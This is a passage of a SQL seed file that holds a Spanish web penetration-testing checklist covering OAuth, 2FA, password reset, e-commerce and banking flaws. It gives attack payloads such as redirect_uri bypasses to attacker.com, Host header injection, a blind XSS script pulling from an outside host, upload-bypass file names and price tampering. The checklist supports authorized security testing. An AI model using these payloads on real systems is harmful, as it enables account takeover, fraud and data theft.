(4, 'OAuth: Resource Owner -> User', 'Definición de rol.\n\n- **Quién es:** El usuario final (la víctima o tú).\n- **Acción:** Es quien hace clic en "Permitir acceso" en la pantalla de consentimiento.', 15),

(4, 'OAuth: Resource Server -> Twitter', 'Definición de rol.\n\n- **Qué es:** La API que tiene los datos del usuario (Google, Facebook, Microsoft).\n- **Seguridad:** Verifica el `access_token` antes de entregar datos.', 16),

(4, 'OAuth: Client Application -> Twitterdeck.com', 'Definición de rol.\n\n- **Quién es:** La aplicación que estás auditando.\n- **Riesgo:** Si es insegura, puede filtrar tokens o permitir el secuestro de cuentas.', 17),

(4, 'OAuth: Authorization Server -> Twitter', 'Definición de rol.\n\n- **Función:** El servidor que muestra el login y emite los tokens.\n- **Punto clave:** Es donde ocurren las vulnerabilidades de `redirect_uri`.', 18),

(4, 'OAuth: client_id -> Twitterdeck ID', 'Identificador Público.\n\n- **Nota:** No es secreto. Se puede ver en la URL (`?client_id=xyz`).\n- **Prueba:** Intenta cambiar el `client_id` por el de otra aplicación legítima para ver si puedes engañar al usuario.', 19),

(4, 'OAuth: client_secret -> Secret Token', 'Identificador Privado (Password de la App).\n\n- **CRÍTICO:** Nunca debe estar en el código frontend (JS) ni en decompilaciones de APKs móviles.\n- **Impacto:** Si robas el secret, puedes firmar tokens y suplantar a la aplicación.', 20),

(4, 'OAuth: response_type -> Defines the token type', 'Tipo de flujo.\n\n- **Code:** `response_type=code` (Más seguro, flujo backend).\n- **Token:** `response_type=token` (Implicit Flow). Deprecado e inseguro. El token viaja en la URL y queda en el historial del navegador.', 21),

(4, 'OAuth: scope -> The requested level of access', 'Permisos solicitados.\n\n- **Prueba:** Intenta manipular el scope. Si la app pide `scope=email`, cámbialo a `scope=admin` o `scope=all`.\n- **Exceso:** Verifica si la app pide más permisos de los necesarios (Privacy violation).', 22),

(4, 'OAuth: redirect_uri -> The URL user is redirected to', 'El vector de ataque principal en OAuth.\n\n- **Qué es:** A dónde envía el servidor el `code` o `token` tras el login.\n- **Ataque:** Si no se valida estrictamente, el atacante lo cambia a `attacker.com` y roba el token.', 23),

(4, 'OAuth: state -> Main CSRF protection', 'Protección Anti-CSRF.\n\n- **Mecanismo:** Un token aleatorio generado por el cliente y verificado al regreso.\n- **Ataque:** Si falta o es estático, un atacante puede vincular SU cuenta de Google/Facebook a la sesión de la víctima.', 24),

(4, 'OAuth: grant_type -> Defines the grant_type', 'Método de obtención de token.\n\n- **Tipos:** `authorization_code`, `client_credentials`, `password`, `refresh_token`.\n- **Nota:** El tipo `password` es altamente desaconsejado porque requiere que el usuario entregue sus credenciales a la app cliente.', 25),

(4, 'OAuth: code -> The authorization code', 'Token temporal de un solo uso.\n\n- **Seguridad:** Debe expirar muy rápido (1-10 min). Debe ser invalidado tras ser usado una vez.\n- **Fuga:** Si se filtra en logs o Referer headers, es crítico.', 26),

(4, 'OAuth: access_token -> The token to make API requests', 'La llave maestra temporal.\n\n- **Bearer Token:** "Quien lo porta tiene acceso".\n- **Prueba:** Verifica si expira correctamente y si da acceso a datos de otros usuarios (IDOR con Token válido).', 27),

(4, 'OAuth: refresh_token -> Allows new access_token', 'Persistencia de sesión.\n\n- **Riesgo:** Si un atacante roba el Refresh Token, tiene acceso permanente a la cuenta.\n- **Prueba:** Verifica que revocar el acceso en el proveedor (e.g., Google Security settings) invalide este token.', 28),

(4, 'OAuth Code Flaws: Re-Using the code', 'Vulnerabilidad de implementación.\n\n- **Prueba:** Intercepta la petición de canje de código. Envíala. Luego, intenta enviar el mismo código `auth_code` de nuevo.\n- **Esperado:** Error 400 "Invalid Grant".\n- **Fallo:** Si devuelve un nuevo Access Token, es vulnerable a ataques de repetición.', 29),

(4, 'OAuth Code Flaws: Code Predict/Bruteforce and Rate-limit', 'Entropía baja.\n\n- **Prueba:** Genera 10 códigos sin usarlos. Analiza si son secuenciales o siguen un patrón temporal.\n- **Fuerza bruta:** Intenta adivinar el código mientras la víctima se está autenticando.', 30),

(4, 'OAuth Code Flaws: Is the code for application X valid for application Y?', 'Falta de vinculación (Binding).\n\n- **Escenario:** Atacante obtiene un código para "App Maliciosa". Intenta canjearlo en el endpoint de "App Legítima".\n- **Vulnerabilidad:** Si el proveedor no valida el `client_id` asociado al código, se puede loguear falsamente.', 31),

(4, 'OAuth Redirect_uri Flaws: URL isn''t validated at all', 'Open Redirect Crítico.\n\n- **Prueba:** Cambia `redirect_uri=https://app.com` por `redirect_uri=https://attacker.com`.\n- **Resultado:** Si el usuario es redirigido a tu sitio, robas el `code` que viaja en la URL.\n- **Impacto:** Account Takeover total.', 32),

(4, 'OAuth Redirect_uri Flaws: Subdomains allowed (Subdomain Takeover)', 'Validación laxa (Regex débil).\n\n- **Prueba:** `redirect_uri=https://subdominio-olvidado.target.com`.\n- **Ataque:** Si ese subdominio es vulnerable a Subdomain Takeover o XSS, el atacante puede leer la URL y robar el token.', 33),

(4, 'OAuth Redirect_uri Flaws: Host is validated, path isn''t (Chain open redirect)', 'Encadenamiento de vulnerabilidades.\n\n- **Escenario:** El sitio valida `target.com` pero no la ruta.\n- **Payload:** `redirect_uri=https://target.com/logout?next=https://attacker.com`.\n- **Flujo:** Auth -> Target (Válido) -> Redirect (Open Redirect) -> Attacker.', 34),

(4, 'OAuth Redirect_uri Flaws: Host is validated, path isn''t (Referer leakages)', 'Fuga por cabeceras.\n\n- **Escenario:** `redirect_uri=https://target.com/dashboard`.\n- **Condición:** Si `/dashboard` tiene imágenes o scripts externos (`analytics.com`), el navegador envía la URL completa (con el `code`) en el header `Referer` a ese tercero.', 35),

(4, 'OAuth Redirect_uri Flaws: Weak Regexes', 'Bypass de filtros de texto.\n\n- **Payloads:**\n  - `target.com.attacker.com`\n  - `attacker.com/target.com`\n  - `target.com@attacker.com`\n- **Objetivo:** Engañar a la expresión regular para que crea que el dominio es confiable.', 36),

(4, 'OAuth Redirect_uri Flaws: Bruteforcing the URL encoded chars after host', 'Ofuscación.\n\n- **Prueba:** Usar caracteres especiales URL-encoded.\n- **Payload:** `https://target.com%252eattacker.com` (Double encoding) o `target.com%00.attacker.com`.', 37),

(4, 'OAuth Redirect_uri Flaws: Bruteforcing the keywords whitelist after host', 'Bypass de lista blanca.\n\n- **Escenario:** El desarrollador permite cualquier URL que contenga "facebook".\n- **Payload:** `https://attacker.com/facebook_login.html`.\n- **Resultado:** Pasa el filtro, pero envía el token al atacante.', 38),

(4, 'OAuth Redirect_uri Flaws: URI validation in place: use typical open redirect payloads', 'Técnicas clásicas.\n\n- **Payloads:**\n  - `///attacker.com`\n  - `//attacker.com`\n  - `https:attacker.com`\n  - `/\/attacker.com`', 39),

(4, 'OAuth State Flaws: Missing State parameter? (CSRF)', 'Ataque de Login CSRF.\n\n- **Prueba:** Elimina el parámetro `state` de la URL de autorización.\n- **Resultado:** Si el flujo continúa sin error, es vulnerable.\n- **Ataque:** El atacante envía un enlace a la víctima que la loguea en la cuenta del atacante. La víctima guarda sus datos (tarjeta de crédito) en la cuenta del atacante sin saberlo.', 40),

(4, 'OAuth State Flaws: Predictable State parameter?', 'Falso sentido de seguridad.\n\n- **Análisis:** ¿El `state` es siempre el mismo? ¿Es `state=123`? ¿Es un timestamp?\n- **Requisito:** Debe ser un hash criptográfico aleatorio y único por sesión.', 41),

(4, 'OAuth State Flaws: Is State parameter being verified?', 'Validación ausente.\n\n- **Prueba:** Genera un `state` válido. En la respuesta, cámbialo por otro valor.\n- **Fallo:** Si la aplicación cliente lo acepta sin compararlo con el que envió originalmente, la protección es inútil.', 42),

(4, 'OAuth Misc: Is client_secret validated?', 'Login bypass en App Owner.\n\n- **Prueba:** Al intercambiar el `code` por el `token` (llamada server-to-server), intenta enviar un `client_secret` incorrecto o vacío.\n- **Fallo:** Si devuelve el token, cualquiera puede suplantar a la aplicación.', 43),

(4, 'OAuth Misc: Pre ATO using facebook phone-number signup', 'Account Takeover previo al registro.\n\n- **Escenario:** Facebook permite registrarse con teléfono. La App objetivo confía en el email de Facebook.\n- **Ataque:** Atacante crea cuenta FB con teléfono de la víctima (si FB no valida email). Se loguea en la App objetivo. Si la App une cuentas por email, el atacante entra en la cuenta de la víctima.', 44),

(4, 'OAuth Misc: No email validation Pre ATO', 'Fusión de cuentas insegura.\n\n- **Escenario:** Atacante crea cuenta en la App con `victima@gmail.com` (sin validar email). Luego la víctima intenta loguearse con "Login with Google" (`victima@gmail.com`).\n- **Fallo:** La App detecta el email y une el OAuth a la cuenta controlada por el atacante (password seteado por atacante).', 45),

(4, 'Test 2FA Misconfiguration: Response Manipulation', 'Bypass lógico simple.\n\n- **Prueba:** Introduce un código 2FA erróneo. Intercepta la respuesta del servidor (`{"status": "error", "message": "invalid"}`).\n- **Ataque:** Cambia el body a `{"status": "success"}` o cambia el código HTTP 403 a 200 OK.\n- **Resultado:** A veces el frontend te deja pasar basándose solo en esa respuesta.', 46),

(4, 'Test 2FA Misconfiguration: Status Code Manipulation', 'Bypass por código de estado.\n\n- **Prueba:** Si recibes un `401 Unauthorized` al poner mal el código.\n- **Ataque:** Cambia el status a `200 OK` en Burp Suite.\n- **Objetivo:** Engañar al navegador para que cargue la siguiente página.', 47),

(4, 'Test 2FA Misconfiguration: 2FA Code Leakage in Response', 'Divulgación de información.\n\n- **Prueba:** Trigger del envío de SMS/Email. Revisa la respuesta JSON del servidor.\n- **Fallo:** A veces los desarrolladores devuelven el código generado en la respuesta para "debug" (`{"sent": true, "code": "123456"}`).', 48),

(4, 'Test 2FA Misconfiguration: 2FA Code Reusability', 'Replay Attack.\n\n- **Prueba:** Usa un código 2FA válido para entrar. Haz logout. Intenta usar EL MISMO código para entrar de nuevo.\n- **Regla:** Los códigos OTP (One Time Password) deben quemarse tras el primer uso.', 49),

(4, 'Test 2FA Misconfiguration: Lack of Brute-Force Protection', 'Ataque de fuerza bruta directo.\n\n\n\n- **Espacio:** Un código de 4 dígitos tiene solo 10,000 combinaciones.\n- **Prueba:** Usa Burp Intruder (Turbo Intruder) para probar de 0000 a 9999.\n- **Fallo:** Si no hay bloqueo tras 5 intentos, el bypass es trivial.', 50),

(4, 'Test 2FA Misconfiguration: Missing 2FA Code Integrity Validation', 'Falta de chequeo en el backend.\n\n- **Escenario:** Flujo de 2 pasos. Login (Paso 1) -> Genera Token temporal -> 2FA (Paso 2).\n- **Prueba:** Intenta usar el Token temporal del Paso 1 para acceder directamente a endpoints protegidos, saltándote el Paso 2.\n- **Forced Browsing:** Navega a `/home` justo después del login, ignorando el prompt de 2FA.', 51),

(4, 'Test 2FA Misconfiguration: With null or 000000', 'Type Juggling / Lógica débil.\n\n- **Payloads:**\n  - `code=null`\n  - `code=` (vacío)\n  - `code=000000`\n  - `code=false`\n  - Envía el parámetro como array: `code[]=123`\n- **Objetivo:** Crashear la validación o hacer que devuelva `true` por error de tipos (PHP loose comparison).', 52);

-- ==========================================
-- CATEGORY: My Account (Post Login) Testing (ID 5)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(5, 'Find parameter which uses active account user id. Try to tamper it', '## IDOR (Insecure Direct Object Reference)\n\nEl ataque más común en paneles de usuario.\n\n- **Prueba:** Captura una petición que cargue tus datos (`/api/profile?id=100`). Cambia el ID a `101`.\n- **Objetivo:** Ver la información PII (Email, Teléfono, Dirección) de otro usuario.\n- **Variante:** Prueba también con GUIDs si son predecibles.', 1),

(5, 'Create a list of features that are pertaining to a user account only', '## Mapeo de Superficie de Ataque\n\nIdentifica funciones privilegiadas.\n\n- **Lista:** Cambio de contraseña, ver historial de pagos, subir foto, gestión de API keys.\n- **Acción:** Intenta acceder a estas funciones desde un usuario con menores privilegios (e.g., Usuario B accediendo a las facturas del Usuario A).', 2),

(5, 'Post login change email id and update with any existing email id', '## Account Takeover (ATO) vía Email\n\n- **Escenario:** El atacante cambia su propio email por el de la víctima.\n- **Prueba:** Loguéate como Atacante. Ve a "Perfil". Cambia tu email a `victima@gmail.com`.\n- **Fallo Crítico:** Si el sistema no valida que el email ya existe o no pide confirmación, podrías secuestrar la cuenta o recibir los correos de reset de password de la víctima.', 3),

(5, 'Open profile picture in a new tab and check the URL', '## IDOR en Archivos Estáticos\n\n- **Análisis:** `https://site.com/uploads/user_100/profile.jpg`.\n- **Prueba:** Cambia `user_100` a `user_101`.\n- **Riesgo:** Fuga de privacidad. A veces permite ver documentos sensibles (KYC, DNI) si se almacenan con patrones predecibles.', 4),

(5, 'Check account deletion option if application provides it', '## Broken Function Level Authorization\n\n- **Prueba:** Captura la petición de borrado de cuenta (`POST /delete_account?user_id=123`).\n- **Ataque:** Cambia el ID por el de la víctima o un administrador.\n- **Impacto:** Denegación de servicio permanente para la víctima.', 5),

(5, 'Change email id, account id, user id parameter and try to brute force other user''s password', '## Password Spraying Horizontal\n\n- **Técnica:** Si el endpoint de login permite identificar usuarios (Enumeration), usa una lista de usuarios válidos y prueba una contraseña común (`Password123`) contra todos ellos.', 6),

(5, 'Check whether application re authenticates for performing sensitive operation', '## Defensa en Profundidad\n\n- **Requisito:** Cambiar email, contraseña o 2FA **debe** requerir ingresar la contraseña actual.\n- **Prueba:** Intenta cambiar el email sin poner la contraseña. Si pasa, es una vulnerabilidad (Session Hijacking risk).', 7);

-- ==========================================
-- CATEGORY: Forgot Password Testing (ID 6)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(6, 'Failure to invalidate session on Logout and Password reset', '## Gestión de Sesión Persistente\n\n- **Escenario:** Tienes una sesión abierta en el móvil y cambias la contraseña en el PC.\n- **Prueba:** Verifica si la sesión del móvil sigue activa tras el cambio.\n- **Riesgo:** Si te roban la cuenta y cambias la clave, el atacante no pierde el acceso si las sesiones no se matan.', 1),

(6, 'Check if forget password reset link/code uniqueness', '## Predicción de Tokens\n\n- **Análisis:** Solicita 5 resets seguidos. Analiza los tokens.\n- **Patrones:** ¿Son secuenciales? ¿Están basados en Base64(Timestamp)?\n- **Ataque:** Si son predecibles, puedes generar un token válido para cualquier usuario sin tener acceso a su email.', 2),

(6, 'Check if reset link does get expire or not', '## Caducidad de Enlace\n\n- **Prueba:** Solicita un reset. Espera 24 horas o usa el enlace después de haber cambiado la contraseña exitosamente.\n- **Regla:** El enlace debe ser de un solo uso (One-Time) y expirar en corto tiempo (15-60 min).', 3),

(6, 'Find user account identification parameter and tamper Id', '## HPP (HTTP Parameter Pollution) en Reset\n\n- **URL:** `site.com/reset?token=xyz&email=victima@mail.com`.\n- **Ataque:** Cambia el email a `atacante@mail.com`. Si el servidor confía en el parámetro email de la URL en lugar del token, podrías cambiar la contraseña del atacante pero loguearte como la víctima (o viceversa).', 4),

(6, 'Check for weak password policy', '## Validación de Fortaleza\n\n- **Prueba:** Al resetear, intenta poner `123456` o la misma contraseña que ya tenías (Reutilización).\n- **Check:** ¿Impide usar el nombre de usuario en la contraseña?', 5),

(6, 'Weak password reset implementation Token is not invalidated after use', '## Replay Attack\n\n- **Prueba:**\n  1. Usa el link de reset y cambia la password.\n  2. Dale "Atrás" en el navegador.\n  3. Intenta cambiar la password de nuevo con el mismo link.\n- **Fallo:** Si funciona, un atacante con acceso a tu historial puede secuestrar la cuenta siempre.', 6),

(6, 'If reset link has another param such as date and time, then change it', '## Manipulación de Lógica\n\n- **URL:** `.../reset?token=abc&timestamp=1620000000`.\n- **Ataque:** Si el enlace expiró, intenta cambiar el timestamp a una fecha futura o actual para "revivir" el token.', 7),

(6, 'Check if security questions are asked? How many guesses allowed?', '## Fuerza Bruta a Preguntas de Seguridad\n\n- **OSINT:** "¿Nombre de tu primera mascota?" o "¿Madre soltera?" suelen estar en redes sociales.\n- **Rate Limit:** Verifica si bloquea tras 5 intentos fallidos. Si no, es trivial de adivinar con diccionarios.', 8),

(6, 'Add only spaces in new password and confirmed password', '## Input Validation Flaw\n\n- **Payload:** `Password: "   "` (tres espacios).\n- **Fallo:** Algunos backends hacen `trim()` y guardan una contraseña vacía, o permiten espacios puros, lo cual rompe validaciones futuras.', 9),

(6, 'Does it display old password on the same page', '## Divulgación de Información\n\n- **Inspección:** Mira el código fuente (`Ctrl+U`) o campos ocultos (`type="hidden"`) en el formulario de reset.\n- **Fallo:** A veces los desarrolladores precargan la contraseña antigua en el HTML por error.', 10),

(6, 'Ask for two password reset link and use the older one', '## Race Condition / Token Management\n\n- **Prueba:** Pide Link A. Inmediatamente pide Link B.\n- **Acción:** Intenta usar el Link A.\n- **Correcto:** El Link A debe morir al generarse el Link B.', 11),

(6, 'Check if active session gets destroyed upon changing the password or not?', '## (Duplicado de Item 1 - Revalidación)\n\nVerifica la destrucción de cookies de sesión `PHPSESSID` o `JWT` revocados.', 12),

(6, 'Weak password reset implementation Password reset token sent over HTTP', '## Intercepción de Tokens (Host Header Injection)\n\n- **Prueba:** Intercepta la petición de "Olvidé mi contraseña". Cambia el header `Host: target.com` a `Host: attacker.com`.\n- **Resultado:** Si el backend construye el link usando el header Host, la víctima recibe un email con `http://attacker.com/reset?token=...`. Si hace click, te regala el token.', 13),

(6, 'Send continuous forget password requests so that it may send sequential tokens', '## Email Bombing / Token Predictability\n\n- **Prueba:** Usa Burp Intruder para enviar 100 peticiones de reset.\n- **Riesgo 1:** DoS a la cuenta de correo de la víctima (Spam).\n- **Riesgo 2:** Si los tokens son `ABC001`, `ABC002`, puedes adivinar el siguiente.', 14);

-- ==========================================
-- CATEGORY: Contact Us Form Testing (ID 7)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(7, 'Is CAPTCHA implemented on contact us form', '## Prevención de Spam/Flooding\n\n- **Riesgo:** Si no hay captcha, un bot puede llenar la base de datos de soporte o enviar miles de emails al equipo interno (DoS).', 1),

(7, 'Does it allow to upload file on the server?', '## Unrestricted File Upload (RCE)\n\n- **Prueba:** Intenta subir `shell.php`, `test.exe`, o `test.html`.\n- **Bypass:** Prueba `shell.php.jpg`, `shell.php%00.jpg` o cambia el Content-Type a `image/jpeg`.\n- **Impacto:** Ejecución remota de código (Compromiso total del servidor).', 2),

(7, 'Blind XSS', '## Ataque Dirigido a Administradores\n\n- **Concepto:** El payload no se ejecuta en tu navegador, sino en el panel de administración cuando el soporte lee tu mensaje.\n- **Payload:** `<script src=//yoursite.xss.ht></script>`.\n- **Herramienta:** `XSS Hunter` o `Burp Collaborator`.', 3);

-- ==========================================
-- CATEGORY: Product Purchase Testing (ID 8)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(8, 'Buy Now: Tamper product ID to purchase other high valued product with low prize', '## Price Manipulation (Parameter Tampering)\n\n\n\n- **Flujo:** Añade un "Lápiz ($1)" al carrito. Intercepta la petición de "Checkout".\n- **Ataque:** Cambia `product_id=1` (Lápiz) por `product_id=500` (MacBook).\n- **Resultado:** Si el backend confía en el precio del ID original pero procesa el ID nuevo, compras un MacBook por $1.', 1),

(8, 'Buy Now: Tamper product data to increase the number of product with the same prize', '## Manipulación de Cantidad\n\n- **Payloads:**\n  - `quantity=0.1`\n  - `quantity=-1` (Devolución negativa / Crédito a favor)\n  - `quantity=999999999` (Overflow)\n- **Objetivo:** Pagar menos o recibir dinero del sistema.', 2),

(8, 'Gift/Voucher: Tamper gift/voucher count in the request', '## Duplicación de Cupones\n\n- **Prueba:** Si la petición es `voucher_ids=[101]`, intenta `voucher_ids=[101, 101]`.\n- **Fallo:** A veces aplica el descuento dos veces.', 3),

(8, 'Gift/Voucher: Tamper gift/voucher value to increase/decrease the value', '## Manipulación de Valor\n\n- **Prueba:** Si el cupón se envía como objeto JSON `{"code": "SAVE10", "value": 10}`, cambia `value` a `100`.\n- **Regla:** El valor debe validarse siempre en el servidor, nunca confiar en el cliente.', 4),

(8, 'Gift/Voucher: Reuse gift/voucher by using old gift values', '## Cupones Caducados\n\n- **Prueba:** Usa un cupón que ya gastaste. O busca códigos de cupones viejos en internet.\n- **Fallo:** El sistema no marca el cupón como "usado" en la base de datos hasta que finaliza el pedido, o olvida validarlo.', 5),

(8, 'Gift/Voucher: Check the uniqueness of gift/voucher parameter', '## Enumeración de Cupones\n\n- **Fuerza Bruta:** Si los códigos son `GIFT-001`, `GIFT-002`, usa Intruder para encontrar cupones válidos de otros usuarios.', 6),

(8, 'Gift/Voucher: Use parameter pollution technique to add the same voucher twice', '## HTTP Parameter Pollution (HPP)\n\n- **Payload:** `POST /cart?voucher=SAVE10&voucher=SAVE10`.\n- **Resultado:** Algunos frameworks (ASP.NET) concatenan los valores, otros toman el último, otros el primero. Si la lógica falla, aplica el descuento doble.', 7),

(8, 'Add/Delete Product from Cart: Tamper user id to delete products', '## IDOR en Carrito\n\n- **Prueba:** `DELETE /cart/item/5?user_id=123`. Cambia el `user_id`.\n- **Impacto:** Griefing (Borrar el carrito de otros usuarios para molestarlos).', 8),

(8, 'Add/Delete Product from Cart: Tamper cart id to add/delete products', '## Inyección de Artículos\n\n- **Prueba:** Añade un artículo a TU carrito. Cambia el `cart_id` al de la víctima.\n- **Escenario:** Obligar a un usuario a comprar algo (útil en ataques de CSRF/Fishing).', 9),

(8, 'Add/Delete Product from Cart: Identify cart id/user id to view added items', '## Fuga de Información (IDOR)\n\n- **Prueba:** `GET /cart?id=123`. Cambia ID.\n- **Impacto:** Ver qué están comprando otros usuarios (Privacidad).', 10),

(8, 'Address: Tamper BurpSuite request to change other user''s shipping address', '## IDOR Crítico\n\n- **Prueba:** En la libreta de direcciones, al hacer "Editar" (`POST /address/update`), cambia el `address_id`.\n- **Impacto:** Sobrescribir la dirección de otro usuario. Si compra algo, te llegará a ti.', 11),

(8, 'Address: Try stored XSS by adding XSS vector on shipping address', '## Stored XSS\n\n- **Payload:** `<img src=x onerror=alert(1)>` en el campo "Calle" o "Notas".\n- **Víctima:** El administrador del panel de pedidos o el repartidor que ve la etiqueta impresa (si es web).', 12),

(8, 'Address: Use parameter pollution technique to add two shipping address', '## Lógica Confusa\n\n- **Prueba:** Enviar dos direcciones distintas en la misma petición HPP.\n- **Objetivo:** Bypasear validaciones de "Dirección no permitida" o corromper la DB.', 13),

(8, 'Place Order: Tamper payment options parameter to change the payment method', '## Evasión de Pago\n\n- **Prueba:** Cambiar `payment_method=CC` (Tarjeta) a `payment_method=COD` (Cash on Delivery) o `INVOICE`.\n- **Objetivo:** Que el sistema procese el pedido sin cobrar la tarjeta inmediatamente.', 14),

(8, 'Place Order: Tamper the amount value for payment manipulation', '## Manipulación Final del Precio\n\n- **Momento:** Justo antes de conectar con la pasarela (PayPal/Stripe).\n- **Ataque:** Cambia `amount=100.00` a `amount=1.00`.\n- **Verificación:** El sistema debe verificar (callback/webhook) que lo pagado coincida con el total de la orden.', 15),

(8, 'Place Order: Check if CVV is going in cleartext or not', '## Cumplimiento PCI-DSS\n\n- **Verificación:** El CVV nunca debe guardarse en logs ni base de datos. Solo debe pasar a la pasarela.\n- **SSL:** Debe viajar encriptado siempre.', 16),

(8, 'Place Order: Check if the application itself processes your card details', '## Seguridad de Pasarela\n\n- **Prueba:** Si el formulario de tarjeta está en `midominio.com`, es peligroso. Lo ideal es que sea un `iframe` o redirección a `stripe.com` o `paypal.com`.', 17),

(8, 'Track Order: Track other user''s order by guessing order tracking number', '## IDOR en Tracking\n\n- **Prueba:** `GET /track/ORD-001`.\n- **Fuerza Bruta:** Iterar números de orden para ver nombres y direcciones de entrega de desconocidos.', 18),

(8, 'Track Order: Brute force tracking number prefix or suffix', '## Predicción de IDs\n\n- **Análisis:** Si el formato es `[FECHA]-[SEQ]`, es fácil generar números válidos.', 19),

(8, 'Wish list: Check if a user A can add/remote products in Wishlist of user B', '## IDOR Menor\n\n- **Prueba:** `POST /wishlist/add?user_id=B&product=X` siendo Usuario A.', 20),

(8, 'Wish list: Check if a user A can add products into user B''s cart from Wishlist', '## Cross-User Interaction\n\n- **Prueba:** Mover item de Wishlist A -> Carrito B mediante manipulación de IDs.', 21),

(8, 'Post product purchase: Check if user A can cancel orders for user B', '## IDOR Crítico (Business Logic)\n\n- **Prueba:** Endpoint `/order/cancel`. Parametro `order_id`.\n- **Impacto:** Sabotaje de pedidos legítimos.', 22),

(8, 'Post product purchase: Check if user A can view/check orders by user B', '## Fuga de Historial\n\n- **Prueba:** Acceder a facturas (`/invoice/123.pdf`) iterando números.', 23),

(8, 'Post product purchase: Check if user A can modify the shipping address of user B', '## Redirección de Pedidos\n\n- **Escenario:** El pedido está "En proceso". El atacante modifica la dirección del pedido ya pagado por la víctima para que le llegue a él.', 24),

(8, 'Out of band: Can user order product which is out of stock?', '## Race Condition de Inventario\n\n\n\n- **Prueba:** Producto con Stock=1. Dos usuarios (hilos) envían "Comprar" al mismo milisegundo.\n- **Herramienta:** `Burp Turbo Intruder`.\n- **Fallo:** El stock baja a -1 y ambos compran el item.', 25);

-- ==========================================
-- CATEGORY: Banking Application Testing (ID 9)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(9, 'Billing Activity: Check if user A can view the account statement for user B', '## IDOR Financiero (Acceso a Información)\n\n- **Endpoint:** `/api/statements/download?account=XXXX`.\n- **Prueba:** Cambiar el número de cuenta. Las aplicaciones bancarias suelen usar números de cuenta secuenciales o predecibles.', 1),

(9, 'Billing Activity: Check if user A can view the transaction report for user B', '## Fuga de Movimientos\n\n- **Prueba:** Solicitar reporte JSON de movimientos cambiando el `customer_id`.\n- **Impacto:** Espionaje financiero total.', 2),

(9, 'Billing Activity: Check if user A can view the summary report for user B', '## Resumen de Saldo\n\n- **Objetivo:** Ver el saldo total de la víctima.', 3),

(9, 'Billing Activity: Check if user A can register for monthly/weekly statement via email', '## Suscripción No Autorizada\n\n- **Ataque:** Suscribir a la víctima a spam de reportes, o suscribir al atacante para recibir los reportes de la víctima (si se permite poner email arbitrario).', 4),

(9, 'Billing Activity: Check if user A can update the existing email id of user B', '## Account Takeover Bancario\n\n- **Crítico:** Si cambias el email, los OTPs y alertas llegarán al atacante.', 5),

(9, 'Deposit/Loan/Linked: Check if user A can view the deposit account summary of user B', '## IDOR en Productos Vinculados\n\n- **Prueba:** A veces la seguridad está en la cuenta corriente, pero se olvidan de proteger los Préstamos o Plazos Fijos.', 6),

(9, 'Deposit/Loan/Linked: Check for account balance tampering for Deposit accounts', '## Integridad de Datos\n\n- **Prueba:** Al abrir un depósito, interceptar y cambiar `amount` o `interest_rate`.\n- **Validación:** El backend debe recalcular siempre basándose en reglas estrictas.', 7),

(9, 'Tax Deduction: Check if user A can see the tax deduction details of user B', '## Fuga de Datos Fiscales\n\n- **Información:** Permite ver ingresos anuales, NIF/DNI y domicilio fiscal.', 8),

(9, 'Tax Deduction: Check parameter tampering for increasing and decreasing interest rate', '## Manipulación de Tasas\n\n- **Escenario:** Calculadoras de préstamos que envían la tasa desde el cliente al servidor para formalizar el contrato.', 9),

(9, 'Tax Deduction: Check if user A can download the TDS details of user B', '## Descarga de Archivos (IDOR)\n\n- **Prueba:** `/download/tds?id=123`. Manipular ID.', 10),

(9, 'Tax Deduction: Check if user A can request for the cheque book behalf of user B', '## Solicitud de Servicios\n\n- **Ataque:** Pedir chequera para la víctima (DoS físico o molestia). Si se puede cambiar la dirección de entrega, es fraude.', 11),

(9, 'Fixed Deposit: Check if is it possible for user A to open FD account behalf of user B', '## Creación de Recursos Cross-User\n\n- **Prueba:** Usar la sesión de A pero enviar el `customer_id` de B al crear el plazo fijo.', 12),

(9, 'Fixed Deposit: Check if Can user open FD account with more amount than balance', '## Lógica de Negocio (Saldo Insuficiente)\n\n- **Prueba:** Saldo = $100. Intentar abrir Plazo Fijo de $1000.\n- **Ataque:** Race condition (gastar el dinero en transferencia y abrir FD simultáneamente) o bypass de validación cliente.', 13),

(9, 'Stopping Payment: Can user A stop the payment of user B via cheque number', '## IDOR en Cancelaciones\n\n- **Prueba:** Detener el pago de un cheque emitiendo una orden de "Stop Payment" sobre un número de cheque que no te pertenece.', 14),

(9, 'Stopping Payment: Can user A stop the payment on basis of date range for user B', '## Denegación de Servicio Financiero\n\n- **Impacto:** Bloquear la operativa de una empresa o usuario cancelando sus pagos.', 15),

(9, 'Status Enquiry: Can user A view the status enquiry of user B', '## Fuga de Consultas\n\n- **Prueba:** Ver tickets de soporte o estado de trámites de otros clientes.', 16),

(9, 'Status Enquiry: Can user A modify the status enquiry of user B', '## Sabotaje\n\n- **Acción:** Cerrar tickets de soporte de otros usuarios o añadir comentarios falsos.', 17),

(9, 'Status Enquiry: Can user A post and enquiry behalf of user B', '## Suplantación de Identidad interna\n\n- **Ataque:** Enviar mensajes ofensivos al banco en nombre de la víctima.', 18),

(9, 'Fund transfer: Is it possible to transfer funds to user C instead of user B', '## Manipulación de Beneficiario (Man-in-the-Browser)\n\n\n\n- **Flujo:** El usuario autoriza pago a B. Atacante intercepta y cambia `dest_account` a C.\n- **Defensa:** Firma de transacción dinámica (2FA que incluye cuenta y monto).', 19),

(9, 'Fund transfer: Can fund transfer amount be manipulated?', '## Manipulación de Monto\n\n- **Prueba:** Cambiar monto a negativo (`-1000`).\n- **Prueba:** Decimales extraños (`0.000001`).\n- **Prueba:** Desbordamiento de enteros (Integer Overflow).', 20),

(9, 'Fund transfer: Can user A modify the payee list of user B', '## Inyección de Beneficiarios\n\n- **Ataque:** Añadir la cuenta del atacante a la lista de "Beneficiarios de Confianza" de la víctima mediante IDOR en el endpoint `/payee/add`.', 21),

(9, 'Fund transfer: Is it possible to add payee without any proper validation', '## Bypass de Validaciones\n\n- **Riesgo:** Si el banco requiere OTP para añadir beneficiario, intentar saltarlo manipulando la respuesta del servidor.', 22),

(9, 'Schedule transfer: Can user A view the schedule transfer of user B', '## Espionaje de Pagos Futuros\n\n- **Impacto:** Conocer la nómina, pago de alquileres, etc.', 23),

